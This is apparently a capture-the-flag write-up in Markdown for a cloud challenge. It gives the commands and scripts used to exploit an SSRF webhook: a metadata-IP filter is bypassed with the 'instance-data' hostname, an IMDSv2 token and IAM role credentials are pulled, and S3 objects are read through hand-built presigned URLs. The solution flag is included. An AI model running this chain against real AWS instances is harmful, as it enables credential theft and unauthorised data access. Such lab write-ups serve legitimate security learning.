@@ -1,0 +1,436 @@
+---
+title: "[ 06 ] THE CLOUD"
+description: "Walkthrough for Cloud SSRF, IMDS, And S3"
+---
+
+---
+## Flag
+---
+
+```text Output
+FAM{cl0ud_ssrf_imds_ada58e71d890}
+```
+
+## Challenge Summary
+---
+
+Prompt:
+
+```text Output
+An internal DevOps monitoring dashboard was accidentally deployed with debug endpoints enabled on a public-facing EC2 instance.
+
+The platform team stores sensitive configuration in an S3 bucket. Your goal: get the flag from the bucket.
+
+hint: debug endpoints reveal more than intended. The instance knows who it is.
+
+Instance IP: 43.205.113.106
+```
+
+This was a cloud SSRF challenge. The app exposed debug metrics and a webhook fetcher. The fetcher could reach AWS metadata and AWS services from the EC2 instance.
+
+## Initial Service Discovery
+---
+
+I first tested common web ports:
+
+```powershell Terminal
+curl.exe -i -s --max-time 10 "http://43.205.113.106/"
+curl.exe -i -s --max-time 10 "https://43.205.113.106/" -k
+```
+
+Initial responses were inconsistent while the instance was starting, so I scanned common ports:
+
+```powershell Terminal
+@'
+import socket, concurrent.futures
+host='43.205.113.106'
+ports=[22,80,443,3000,3001,4000,5000,5001,5173,5432,5601,6379,7000,8000,8001,8080,8081,8088,8888,9000,9001,9090,9091,9100,9200,9300,9418,9999,10000,15672,27017]
+ports += list(range(1,1025))
+ports=sorted(set(ports))
+def check(p):
+    s=socket.socket(); s.settimeout(0.8)
+    try:
+        s.connect((host,p)); s.close(); return p
+    except Exception:
+        return None
+with concurrent.futures.ThreadPoolExecutor(max_workers=200) as ex:
+    openp=[p for p in ex.map(check, ports) if p]
+print(openp)
+'@ | python -
+```
+
+Output:
+
+```text Output
+[80]
+```
+
+Why: confirm the exposed service was on HTTP port 80.
+
+## Dashboard Recon
+---
+
+I fetched `/`:
+
+```powershell Terminal
+curl.exe -v --connect-timeout 5 --max-time 15 "http://43.205.113.106/"
+```
+
+Key response headers:
+
+```text Output
+Server: Werkzeug/3.1.8 Python/3.9.25
+```
+
+Dashboard endpoints shown in HTML:
+
+```text Output
+/status
+/metrics/system
+/metrics/config
+/metrics/endpoints
+/internal/webhook
+```
+
+Why: the dashboard itself listed useful API endpoints.
+
+## Pulling Debug Endpoints
+---
+
+I queried the documented endpoints:
+
+```powershell Terminal
+curl.exe -i -s "http://43.205.113.106/status"
+curl.exe -i -s "http://43.205.113.106/metrics/system"
+curl.exe -i -s "http://43.205.113.106/metrics/config"
+curl.exe -i -s "http://43.205.113.106/metrics/endpoints"
+```
+
+Important `/metrics/config` output:
+
+```json Data.json
+{
+  "flags": {
+    "debug_endpoints": true,
+    "metrics_auth": false,
+    "webhook_enabled": true
+  },
+  "identity": {
+    "imds": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "note": "credentials scoped to storage prefix only",
+    "provider": "ec2-instance-metadata"
+  },
+  "storage": {
+    "backend": "s3",
+    "bucket": "fam-ctf-cloud-challenge",
+    "note": "bucket access restricted to requests originating from within vpc",
+    "prefix": "players/907",
+    "region": "ap-south-1"
+  }
+}
+```
+
+Important `/metrics/endpoints` output:
+
+```json Data.json
+{
+  "endpoints": [
+    {"methods":["GET","POST","PUT"],"path":"/internal/webhook"}
+  ]
+}
+```
+
+Why:
+
+- The bucket was `fam-ctf-cloud-challenge`.
+- The prefix was `players/907`.
+- Bucket access was restricted to VPC origin.
+- The app had a webhook that could make internal requests.
+
+## Understanding The Webhook
+---
+
+I probed `/internal/webhook`:
+
+```powershell Terminal
+curl.exe -i -s "http://43.205.113.106/internal/webhook"
+curl.exe -i -s -X POST "http://43.205.113.106/internal/webhook"
+curl.exe -i -s -X POST "http://43.205.113.106/internal/webhook" -H "Content-Type: application/json" -d "{}"
+```
+
+Output:
+
+```json Data.json
+{
+  "error":"Missing 'url' parameter",
+  "note":"Only internal AWS endpoints are permitted (169.254.x.x, *.amazonaws.com)",
+  "usage":"POST /internal/webhook?url=<target>"
+}
+```
+
+Why: the webhook accepted a URL parameter and made server-side HTTP requests. This is SSRF.
+
+## First IMDS Attempt
+---
+
+I tried direct metadata IP:
+
+```powershell Terminal
+curl.exe -i -s -X POST "http://43.205.113.106/internal/webhook?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+```
+
+Output:
+
+```json Data.json
+{
+  "error":"Direct access to internal IP ranges is not allowed.",
+  "hint":"Try harder. The instance has a name."
+}
+```
+
+Why: the filter blocked literal internal IPs. The hint suggested using a hostname.
+
+## Using The EC2 Metadata Hostname
+---
+
+EC2 metadata is often available through the hostname `instance-data`.
+
+I tried:
+
+```powershell Terminal
+curl.exe -i -s -X POST "http://43.205.113.106/internal/webhook?url=http://instance-data/latest/meta-data/iam/security-credentials/"
+```
+
+Output was 401:
+
+```text Output
+401 Unauthorized
+```
+
+Why: this bypassed the literal-IP filter, but IMDSv2 required a token.
+
+## Obtaining An IMDSv2 Token
+---
+
+The endpoint list showed `/internal/webhook` accepted PUT. I used PUT to request an IMDSv2 token:
+
+```powershell Terminal
+curl.exe -i -s -X PUT `
+  "http://43.205.113.106/internal/webhook?url=http://instance-data/latest/api/token" `
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+```
+
+Output:
+
+```json Data.json
+{
+  "body":"<IMDSv2 token>",
+  "status":200,
+  "url":"http://instance-data/latest/api/token"
+}
+```
+
+Why: IMDSv2 requires a token created with `PUT /latest/api/token`.
+
+## Reading The Role Name
+---
+
+Using the token:
+
+```powershell Terminal
+$tok=(curl.exe -s -X PUT `
+  "http://43.205.113.106/internal/webhook?url=http://instance-data/latest/api/token" `
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" | ConvertFrom-Json).body
+
+curl.exe -i -s `
+  "http://43.205.113.106/internal/webhook?url=http://instance-data/latest/meta-data/iam/security-credentials/" `
+  -H "X-aws-ec2-metadata-token: $tok"
+```
+
+Output:
+
+```text Output
+ctf-cloud-player-907
+```
+
+I also confirmed instance identity:
+
+```powershell Terminal
+curl.exe -i -s `
+  "http://43.205.113.106/internal/webhook?url=http://instance-data/latest/dynamic/instance-identity/document" `
+  -H "X-aws-ec2-metadata-token: $tok"
+```
+
+Output included:
+
+```json Data.json
+{
+  "accountId": "575078236408",
+  "availabilityZone": "ap-south-1a",
+  "instanceId": "i-0ab703c5dbe384a66",
+  "privateIp": "10.20.1.100",
+  "region": "ap-south-1"
+}
+```
+
+## Pulling Temporary Role Credentials
+---
+
+Command:
+
+```powershell Terminal
+$tok=(curl.exe -s -X PUT `
+  "http://43.205.113.106/internal/webhook?url=http://instance-data/latest/api/token" `
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" | ConvertFrom-Json).body
+
+curl.exe -s `
+  "http://43.205.113.106/internal/webhook?url=http://instance-data/latest/meta-data/iam/security-credentials/ctf-cloud-player-907" `
+  -H "X-aws-ec2-metadata-token: $tok" `
+  | Tee-Object -FilePath imds_creds_response.json
+```
+
+The response contained temporary AWS credentials:
+
+```json Data.json
+{
+  "Code": "Success",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "REDACTED",
+  "SecretAccessKey": "REDACTED",
+  "Token": "REDACTED",
+  "Expiration": "2026-07-08T11:46:25Z"
+}
+```
+
+Why redacted here: these were live temporary credentials during the challenge. The exact values are not needed for the writeup.
+
+## Listing The S3 Prefix From Inside The VPC
+---
+
+Bucket access was restricted to requests originating from inside the VPC. If I used the credentials directly from my machine, S3 origin restrictions could block the request. So I generated a presigned S3 URL locally, then asked `/internal/webhook` to fetch it.
+
+Python signing script shape:
+
+```powershell Terminal
+@'
+import json, urllib.parse, hashlib, hmac, datetime, subprocess, re
+outer=json.load(open('imds_creds_response.json'))
+creds=json.loads(outer['body'])
+access=creds['AccessKeyId']; secret=creds['SecretAccessKey']; token=creds['Token']
+region='ap-south-1'; service='s3'; bucket='fam-ctf-cloud-challenge'
+
+def sign(key,msg):
+    return hmac.new(key, msg.encode(), hashlib.sha256).digest()
+
+def presign(host, path, params=None, expires=900):
+    params = dict(params or {})
+    now=datetime.datetime.utcnow()
+    amzdate=now.strftime('%Y%m%dT%H%M%SZ')
+    datestamp=now.strftime('%Y%m%d')
+    scope=f'{datestamp}/{region}/{service}/aws4_request'
+    params.update({
+        'X-Amz-Algorithm':'AWS4-HMAC-SHA256',
+        'X-Amz-Credential':f'{access}/{scope}',
+        'X-Amz-Date':amzdate,
+        'X-Amz-Expires':str(expires),
+        'X-Amz-Security-Token':token,
+        'X-Amz-SignedHeaders':'host',
+    })
+    def enc(s):
+        return urllib.parse.quote(str(s), safe='-_.~')
+    qs='&'.join(f'{enc(k)}={enc(v)}' for k,v in sorted(params.items()))
+    canonical='GET\n'+path+'\n'+qs+'\nhost:'+host+'\n\nhost\nUNSIGNED-PAYLOAD'
+    sts='AWS4-HMAC-SHA256\n'+amzdate+'\n'+scope+'\n'+hashlib.sha256(canonical.encode()).hexdigest()
+    kDate=sign(('AWS4'+secret).encode(), datestamp)
+    kRegion=sign(kDate, region)
+    kService=sign(kRegion, service)
+    kSigning=sign(kService, 'aws4_request')
+    sig=hmac.new(kSigning, sts.encode(), hashlib.sha256).hexdigest()
+    return f'https://{host}{path}?{qs}&X-Amz-Signature={sig}'
+
+url=presign(
+    f'{bucket}.s3.{region}.amazonaws.com',
+    '/',
+    {'list-type':'2','prefix':'players/907/'}
+)
+wh='http://43.205.113.106/internal/webhook?url='+urllib.parse.quote(url, safe='')
+r=subprocess.run(['curl.exe','-s',wh],capture_output=True,timeout=30)
+print(r.stdout.decode('utf-8','replace'))
+'@ | python -
+```
+
+Output:
+
+```xml Data.xml
+<ListBucketResult>
+  <Name>fam-ctf-cloud-challenge</Name>
+  <Prefix>players/907/</Prefix>
+  <KeyCount>1</KeyCount>
+  <Contents>
+    <Key>players/907/flag.txt</Key>
+  </Contents>
+</ListBucketResult>
+```
+
+Why: presigned URL supplies valid AWS authorization, and the webhook makes the request from the EC2/VPC network location.
+
+## Fetching The Flag Object
+---
+
+I generated a presigned URL for `/players/907/flag.txt` and fetched it through the webhook:
+
+```powershell Terminal
+@'
+# Same presign helper as above
+url=presign(
+    f'{bucket}.s3.{region}.amazonaws.com',
+    '/players/907/flag.txt'
+)
+wh='http://43.205.113.106/internal/webhook?url='+urllib.parse.quote(url, safe='')
+r=subprocess.run(['curl.exe','-s',wh],capture_output=True,timeout=30)
+print(r.stdout.decode('utf-8','replace'))
+print(re.findall(rb'FAM\{[^}]+\}', r.stdout))
+'@ | python -
+```
+
+Output:
+
+```json Data.json
+{
+  "body":"FAM{cl0ud_ssrf_imds_ada58e71d890}",
+  "status":200
+}
+```
+
+## Why This Worked
+---
+
+The dashboard leaked internal cloud configuration and exposed a server-side fetch endpoint. The fetch endpoint allowed AWS hostnames and forwarded methods/headers, enabling IMDSv2 token retrieval through `instance-data`. The instance role had S3 access to the challenge prefix. Since the bucket also required VPC-origin requests, presigned S3 URLs had to be fetched through the same SSRF endpoint.
+
+## Other Methods That Could Have Worked
+---
+
+- If AWS CLI was available and VPC restriction did not exist, set `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`, then run:
+
+```powershell Terminal
+aws s3 ls s3://fam-ctf-cloud-challenge/players/907/ --region ap-south-1
+aws s3 cp s3://fam-ctf-cloud-challenge/players/907/flag.txt - --region ap-south-1
+```
+
+- Use `botocore`/`boto3` to generate presigned URLs instead of manually implementing SigV4.
+- Try direct SSRF to S3 path-style endpoints if virtual-hosted style failed.
+- Enumerate additional debug endpoints if `/internal/webhook` had not been listed.
+
+## High-Level Solve Path
+---
+
+1. Discover HTTP dashboard on port 80.
+2. Read debug metrics.
+3. Extract S3 bucket, prefix, region, and IMDS hint.
+4. Identify `/internal/webhook` as SSRF.
+5. Bypass literal IP block with `http://instance-data`.
+6. Use PUT through webhook to obtain IMDSv2 token.
+7. Use token to fetch IAM role and temporary credentials.
+8. Generate presigned S3 URLs.
+9. Fetch S3 list/object through webhook to satisfy VPC origin restriction.
+10. Recover the flag.
